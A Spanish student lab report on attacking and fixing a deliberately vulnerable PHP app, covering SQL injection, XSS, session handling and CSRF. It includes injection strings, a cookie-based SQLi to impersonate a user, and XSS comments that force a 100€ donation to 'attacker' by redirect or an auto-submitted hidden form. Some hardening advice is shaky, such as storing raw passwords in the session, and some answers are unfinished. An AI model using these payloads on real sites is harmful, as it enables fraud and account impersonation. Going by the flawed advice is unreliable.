# Informe Técnico

## Parte 1 - SQLi

### a) Dad un ejemplo de combinación de usuario y contraseña que provoque un error en la consulta SQL generada por este formulario. Apartir del mensaje de error obtenido, decid cuál es la consulta SQL que se ejecuta, cuál de los campos introducidos al formulario utiliza y cuál no.

| Dato a introducir | Respuesta |
|---------|---------|
| Escribo los valores | "hola |
| En el campo | User |
| Del formulario de la página | insert_player.php |
| Consulta SQL ejecutada | SELECT userId, password FROM users WHERE username=""hola" |
| Campos del formulario web utilizados en la consulta | User |
| Campos del formulario web no utilizados en la consulta | Password |

### b) Gracias a la SQL Injection del apartado anterior, sabemos que este formulario es vulnerable y conocemos el nombre de los campos de la tabla “users”. Dad un ataque que, utilizando el diccionario que se muestra a continuación, nos permita impersonar un usuario de esta aplicación y acceder en nombre suyo. Tened en cuenta que no sabéis ni cuántos usuarios hay registrados en la aplicación, ni los nombres de estos.
+ password
+ 123456
+ 12345678
+ 1234
+ qwerty
+ 12345678
+ dragon

| Dato a introducir | Respuesta |
|---------|---------|
| Explicación del ataque | El ataque consiste en repetir intentos de autenticación para cada nombre de usuario probado utilizando en cada interacción una contraseña diferente del diccionario. |
| Campo de usuario con que el ataque ha tenido éxito | luis |
| Campo de contraseña con que el ataque ha tenido éxito | 1234 |

### c) Si vais a `private/auth.php`, veréis que en la función `areUserAndPasswordValid`, se utiliza “SQLite3::escapeString()”, pero, aun así, el formulario es vulnerable a SQL Injections, explicad cuál es el error de programación de esta función y como lo podéis corregir.

| Dato a introducir | Respuesta |
|---------|---------|
| Explicación del error | SQLite3::escapeString() se aplica a toda la consulta en lugar de solo al parámetro $user. Como resultado, las comillas dobles que delimitan el valor del usuario no se eliminan correctamente, lo que permite la inyección de código SQL malicioso. |
| Solución: Cambiar la línea con el código... | <br>`$query = SQLite3::escapeString('SELECT userId, password FROM users WHERE username = " ', $user, ' " ');`<br>|
| por las siguientes líneas...|<br>`$query = "SELECT userId, password FROM users WHERE username = :username";`<br>`$stmt = $db -> prepare ($query);`<br>`$stmt -> bindValue(':username', $user, SQLITE3_TEXT);` |

### d) Si habéis tenido éxito con el apartado b), os habéis autenticado utilizando el usuario `luis` (si no habéis tenido éxito, podéis utilizar la contraseña 1234 para realizar este apartado). Con el objetivo de mejorar la imagen de la jugadora *Candela Pacheco*, le queremos escribir un buen puñado de comentarios positivos, pero no los queremos hacer todos con la misma cuenta de usuario. 
### Para hacer esto, en primer lugar habéis hecho un ataque de fuerza bruta sobre eldirectorio del servidor web (por ejemplo, probando nombres de archivo) y habéis encontrado el archivo `add\_comment.php~`. Estos archivos seguramente se han creado como copia de seguridad al modificar el archivo “.php” original directamente al servidor. En general, los servidores web no interpretan (ejecuten) los archivos `.php~` sino que los muestran como archivos de texto sin interpretar.
### Esto os permite estudiar el código fuente de `add\_comment.php` y encontrar una vulnerabilidad para publicar mensajes en nombre de otros usuarios. ¿Cuál es esta vulnerabilidad, y cómo es el ataque que utilizáis para explotarla?

| Dato a introducir | Respuesta |
|---------|---------|
| Vulnerabilidad detectada | El problema reside en la construcción de la consulta SQL. Aunque $body está escapado, $_GET['id'] y $_COOKIE['userId'] se insertan directamente en la consulta sin ningún tipo de escape o validación, lo que permite inyecciones SQL maliciosas. |
| Descripción del ataque | Podemos modificar la cookie "userId" para inyectar una consulta que obtenga el ID de otro usuario (por ejemplo luis). Esto permitiría publicar comentarios en su nombre. En "Developer Tools" del navegador, cambiamos el valor de "userId" por: ' (SELECT userId FROM users WHERE username = 'luis') ' . Una vez hecho esto, podremos enviar un comentario normal, ya que esa consulta SQL insertará el userId de luis. |
| Solución | Para corregir esta vulnerabilidad podemos usar consultas preparadas como las siguientes:<br>`$stmt = $db -> prepare("INSERT INTO comments (playerId, userId, body) VALUES (?, ?, ?)");`<br>`$stmt -> bindValue(1, $_GET['id'], SQLITE3_INTEGER);`<br>`$stmt -> bindValue(2, $_COOKIE['userId'], SQLITE3_INTEGER);`<br>`$stmt -> bindValue(3, $body, SQLITE3_TEXT);`<br>`$stmt -> execute();`<br>Esta solución previene efectivamente las inyecciones SQL al separar los datos de la estructura de la consulta. |

## Parte 2 - XSS

### a) Para ver si hay un problema de XSS, crearemos un comentario que muestre un alert de Javascript siempre que alguien consulte el/los comentarios de aquel jugador (show_comments.php). Dad un mensaje que genere un «alert»de Javascript al consultar el listado de mensajes.

| Dato a introducir | Respuesta |
|---------|---------|
| Introduzco el mensaje ... | `<script>alert(“Hacked”);</script>` |
| En el formulario de la página … | show_comments.php|

### b) ¿ Por qué dice &amp ; cuando miráis un link (como el que aparece a la portada de esta aplicación pidiendo que realices un donativo) con parámetros GETdentro de código html si en realidad el link es sólo con "&" ?

| Dato a introducir | Respuesta |
|---------|---------|
| Explicación ... | Usamos **& amp;** en lugar de **&** ya que el carácter **&** tiene un significado especial en HTML y debe ser escapado para evitar problemas de interpretación. |

### c) Explicad cuál es el problema de `show\_comments.php` , y cómo lo arreglaríais. Para resolver este apartado, podéis mirar el código fuente de esta página.

| Dato a introducir | Respuesta |
|---------|---------|
| ¿Cuál es el problema? | El problema principal se encuentra en el siguiente trozo de código:<br>`echo "<div>`<br>`    <h4> ". $row['username'] ."</h4> `<br>`    <p>commented: " . $row['body'] . "</p>`<br>`</div>";`<br>Los datos obtenidos de la base de datos ($row['username'] y $row['body']) se están imprimiendo directamente en el HTML sin ningún tipo de escape o sanitización.<br><br>Esto significa que si un atacante logra insertar código JavaScript en estos campos, ese código se ejecutará en el navegador de cualquier usuario que vea la página. |
| Sustituyo el código de la/las líneas … | `echo "<div>`<br>`    <h4> ". $row['username'] ."</h4> `<br>`    <p>commented: " . $row['body'] . "</p>`<br>`</div>";` |
| … por el siguiente código … | `echo "<div>`<br>`    <h4>" . htmlspecialchars($row['username'], ENT_QUOTES, 'UTF-8') . "</h4> `<br>`    <p>commented: " . htmlspecialchars($row['body'], ENT_QUOTES, 'UTF-8') . "</p>`<br>`</div>";`<br><br>(la función htmlspecialchars() permite convertir caracteres especiales en entidades HTML, lo que evitará que se interpreten como código.) |

### d) Descubrid si hay alguna otra página que esté afectada por esta misma vulnerabilidad. En caso positivo, explicad cómo lo habéis descubierto.

| Dato a introducir | Respuesta |
|---------|---------|
|Otras páginas afectadas …||
|¿Cómo lo he descubierto? …||

## Parte 3 - Control de acceso, autenticación y sesiones de usuarios

### a) En el ejercicio 1, hemos visto cómo era inseguro el acceso de los usuarios a la aplicación. En la página de register.php tenemos el registro de usuario. ¿Qué medidas debemos implementar para evitar que el registro sea inseguro? Justifica esas medidas e implementa las medidas que sean factibles en este proyecto.

Debemos implementar las siguientes medidas:

#### Utilizar prepared statements en lugar de SQLite3::escapeString, ya que con ellas se previenen mejor las inyecciones SQL al ofrecer una separación clara entre los datos y la estructura de la consulta. El código a implementar sería el siguiente:

```bash
$stmt = $db->prepare("INSERT INTO users (username, password) VALUES (:username, :password)");
$stmt->bindValue(':username', $username, SQLITE3_TEXT);
$stmt->bindValue(':password', $password, SQLITE3_TEXT);
$stmt->execute();
```

Este código ofrece las siguientes funcionalidades:
- Al separar los datos de la estructura de la consulta, se evita que entradas maliciosas manipulen la lógica de la consulta.
- No es necesario escapar manualmente los datos, ya que el motor de la base de datos lo hace automáticamente.
- Para consultas repetitivas, las declaraciones preparadas pueden ser más eficientes, ya que la base de datos puede reutilizar el plan de ejecución.
- Al especificar SQLITE3_TEXT, aseguramos que los datos se traten correctamente como texto en la base de datos.


#### Validar y sanitizar las entradas, lo que prevendrá los ataques XSS. El código a implementar sería el siguiente:

```bash
$username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);
if (!$username || strlen($username) < 3 || strlen($username) > 50) {
    die("Invalid username");
}
```

Este código sanitiza la entrada del usuario para el nombre de usuario, y luego verifica que tenga entre 3 y 50 caracteres. Si no cumple con estos criterios, el script se detiene, evitando que se procesen nombres de usuario inválidos.


#### Implementar protección contra CSRF para prevenir ataques de falsificación de solicitudes entre sitios. Para ello podríamos escribir el siguiente código:

```bash
session_start();
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        die("CSRF token validation failed");
    }
}
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));
```

Este código protege contra CSRF ya que genera un token único para cada sesión, verifica que cada solicitud POST incluya este token, asegura que el token enviado coincida con el almacenado en la sesión y genera un nuevo token después de cada verificación, lo que aumenta la seguridad.


#### Implementar una política de contraseñas seguras que obligue a los usuarios a crear contraseñas más robustas, dificultando los ataques de fuerza bruta. Para ello podríamos introducir el siguiente código:

```bash
if (strlen($password) < 8 || !preg_match("/[A-Z]/", $password) || !preg_match("/[a-z]/", $password) || !preg_match("/[0-9]/", $password)) {
    die("Password must be at least 8 characters long and contain uppercase, lowercase, and numbers");
}
```

Este código hace que la contraseña deba tener una longitud mínima de 8 caracteres y que incluya mayúsculas, minúsculas y números, lo que ayuda a mejorar su seguridad.

#### Hashear las contraseñas para proteger su confidencialidad en caso de que la base de datos se vea comprometida. Para ello podríamos insertar la siguiente línea de código:

```bash
$hashedPassword = password_hash($password, PASSWORD_DEFAULT);
```

### b) En el apartado de login de la aplicación, también deberíamos implantar una serie de medidas para que sea seguro el acceso, (sin contar la del ejercicio 1.c). Como en el ejercicio anterior, justifica esas medidas e implementa las que sean factibles y necesarias (ten en cuenta las acciones realizadas en el register). Puedes mirar en la carpeta `private`.

 Se deben implementar estas medidas:

#### Usar sesiones en lugar de cookies: Las cookies son vulnerables a ataques de intercepción y manipulación. En cambio, las sesiones almacenan datos en el servidor, lo que es más seguro para información sensible como nombres de usuario y contraseñas.

Para ello podemos escribir el siguiente código:

```bash
session_start();
if (isset($_POST['username'])) {
    $_SESSION['user'] = $_POST['username'];
    if(isset($_POST['password'])) {
        $_SESSION['password'] = $_POST['password'];
    }
}
```


#### Hashear las contraseñas, ya que almacenarlas en texto plano supone una gran vulnerabilidad. Haremos uso del siguiente código:

```bash
if(isset($_POST['password'])) {
    $_SESSION['password'] = password_hash($_POST['password'], PASSWORD_DEFAULT);
}
```

#### Validar y sanitizar todas las entradas de usuario para prevenir ataques de inyección y XSS, a partir del siguiente código:

```bash
$username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);
```

Esta línea de código utiliza la función filter_input() de PHP para obtener y sanitizar el valor del campo 'username' enviado por POST.

### c) Volvemos a la página de `register.php`, vemos que está accesible para cualquier usuario, registrado o sin registrar. Al ser una aplicación en la cual no debería dejar a los usuarios registrarse, qué medidas podríamos tomar para poder gestionarlo e implementa las medidas que sean factibles en este proyecto.

 Además de las medidas que expusimos en el apartado a), para ofrecer un sistema de acceso seguro se deberían considerar también las siguientes:

#### Implementar un sistema de roles y permisos y verificar la autenticación del usuario en cada página restringida. Para ello podemos introducir el siguiente código:

```bash
// Verificar autenticación
function isAuthenticated() {
    return isset($_SESSION['user_id']);
}

// Verificar rol
function hasRole($role) {
    return $_SESSION['user_role'] === $role;
}

// Uso
if (!isAuthenticated()) {
    header('Location: login.php');
    exit();
}

if (!hasRole('admin')) {
    die('Acceso denegado');
}
```

#### Usar HTTPS para cifrar la comunicación y regenerar el ID de sesión tras un inicio de sesión exitoso. Para ello introduciremos el siguiente trozo de código:

```bash
// Forzar HTTPS
if (empty($_SERVER['HTTPS']) || $_SERVER['HTTPS'] === 'off') {
    $redirect = 'https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    header('HTTP/1.1 301 Moved Permanently');
    header('Location: ' . $redirect);
    exit();
}

// Después de un inicio de sesión exitoso
session_start();
if ($login_successful) {
    session_regenerate_id(true);
    $_SESSION['user_id'] = $user_id; // Asignar el ID de usuario u otra información relevante
}
```

Este código verifica si la conexión es HTTPS y, si no lo es, redirige al usuario a la versión segura del sitio. Además, tras un inicio de sesión exitoso, regenera el ID de sesión para mejorar la seguridad.

#### Establecer tiempos de expiración para sesiones inactivas e implementar un mecanismo seguro para cerrar sesión. Podemos hacer todo esto escribiendo el siguiente código:

```bash
// Establecer tiempo de expiración
$_SESSION['LAST_ACTIVITY'] = time();

// Verificar expiración
if (isset($_SESSION['LAST_ACTIVITY']) && (time() - $_SESSION['LAST_ACTIVITY'] > 1800)) {
    session_unset();
    session_destroy();
    header('Location: login.php');
    exit();
}

// Cerrar sesión
session_unset();
session_destroy();
```

Este código asegura que las sesiones inactivas se cierren automáticamente después de 30 minutos y proporciona un método para cerrar sesiones manualmente.

### d) Al comienzo de la práctica hemos supuesto que la carpeta private no tenemos acceso, pero realmente al configurar el sistema en nuestro equipo de forma local. ¿Se cumple esta condición? ¿Qué medidas podemos tomar para que esto no suceda?

No. Para evitar el acceso no autorizado a la carpeta `private` podemos tomar las siguientes medidas:

+ Establecer permisos restrictivos en la carpeta para que solo el servidor web pueda acceder a ella.

+ Cifrar los archivos sensibles dentro de la carpeta.

+ Configurar una autenticación de usuario y contraseña para acceder a la carpeta utilizando el panel de control del servidor web.

### e) Por último, comprobando el flujo de la sesión del usuario. Analiza si está bien asegurada la sesión del usuario y que no podemos suplantar a ningún usuario. Si no está bien asegurada, qué acciones podríamos realizar e implementarlas.

Para asegurar la sesión del usuario e impedir la suplantación de este basta con realizar los cambios mencionados en los apartados a) y c) al archivo register.php de la aplicación.

## Parte 4 - Servidores web

### ¿Qué medidas de seguridad se implementariaís en el servidor web para reducir el riesgo a ataques?

+ Implementar un firewall de aplicaciones web (WAF) para protegernos de ataques comunes como inyección SQL o XSS.

+ Utilizar certificados SSL/TLS para cifrar el tráfico.

+ Usar tokens CSRF y verificar las solicitudes de origen para prevenir los ataques CSRF.

+ Sanitizar la salida y utilizar Content Security Policy.

## Parte 5 - CSRF

### a) Editad un jugador para conseguir que, en el listado de jugadores `list\_players.php` aparezca, debajo del nombre de su equipo y antes de `show/add comments` un botón llamado `Profile` que corresponda a un formulario que envíe a cualquiera que haga clic sobre este botón a esta dirección que hemos preparado.

+ **En el campo:** `body` de `list_players.php`
+ **Introduzco**:
 ```bash
   while ($row = $result->fetchArray()) {
    echo "
        <li>
        <div>
        <span>Name: " . $row['name'] . "</span>
        <span>Team: " . $row['team'] . "</span>
        </div>
        <div>";

    
    if ($row['name'] == "Noah Bonet") { 
        echo "<a href=\"http://web.pagos/donate.php?amount=100&receiver=attacker\" style=\"margin-right: 10px;\">Profile</a>";
    }

    echo "
        <a href=\"show_comments.php?id=" . $row['playerid'] . "\">(show/add comments)</a> 
        <a href=\"insert_player.php?id=" . $row['playerid'] . "\">(edit player)</a>
        </div>
        </li>\n";
}
``` 

### b) Una vez lo tenéis terminado, pensáis que la eficacia de este ataque aumentaría si no necesitara que elusuario pulse un botón. Con este objetivo, cread un comentario que sirva vuestros propósitos sin levantar ninguna sospecha entre los usuarios que consulten los comentarios sobre un jugador (`show\_comments.php`).

 Para realizar este apartado hemos aprovechado la vulnerabilidad de XSS y hemos insertado el siguiente código JavaScript en el campo “body” del formulario de `show_comments.php`:

```bash
<p>¡Gran jugador! <script>window.location.href = 'http://web.pagos/donate.php?amount=100&receiver=attacker';</script></p>
```

Este comentario parece inofensivo, pero en realidad oculta un script dentro de él que redirige al usuario a la URL maliciosa una vez que consulta los comentarios de un jugador.

### c) Pero web.pagos sólo gestiona pagos y donaciones entre usuarios registrados, puesto que, evidentemente, le tiene que restar los 100€ a la cuenta de algún usuario para poder añadirlos a nuestra cuenta.
### Explicad qué condición se tendrá que cumplir por que se efectúen las donaciones de los usuarios que visualicen el mensaje del apartado anterior o hagan click en el botón del apartado a).

(HACER)


### d) Si web.pagos modifica la página `donate.php` para que reciba los parámetros a través de POST, quedaría blindada contra este tipo de ataques? En caso negativo, preparad un mensaje que realice un ataque equivalente al de la apartado b) enviando los parámetros “amount” y “receiver” por POST.

Cambiar los parámetros de GET a POST no blindaría completamente la página contra ataques. 

Aunque POST es más seguro que GET para enviar datos sensibles, un atacante aún podría explotar vulnerabilidades CSRF o combinar CSRF con XSS para forzar una donación no autorizada.

De hecho, un atacante podría inyectar este código XSS en el campo “body” de show_comments.php: 

```bash
<p>¡Gran jugador! 
<script>
  // Crear un formulario oculto
  var form = document.createElement('form');
  form.method = 'POST';
  form.action = 'http://web.pagos/donate.php';

  // Añadir parámetros
  var params = {
    amount: 100,
    receiver: 'attacker'
  };

  for (var key in params) {
    var input = document.createElement('input');
    input.type = 'hidden';
    input.name = key;
    input.value = params[key];
    form.appendChild(input);
  }

  // Enviar el formulario automáticamente
  document.body.appendChild(form);
  form.submit();
</script>
</p>
```

Este trozo de código realizará las siguientes acciones:

+ Crear un formulario oculto con método POST que redireccionará al usuario a `http://web.pagos/donate.php`.

+ Añade los campos ocultos amount y receiver.

+ Envía el formulario automáticamente al consultar los comentarios de un jugador.

Si el usuario está autenticado en `web.pagos`, se realizará la donación.

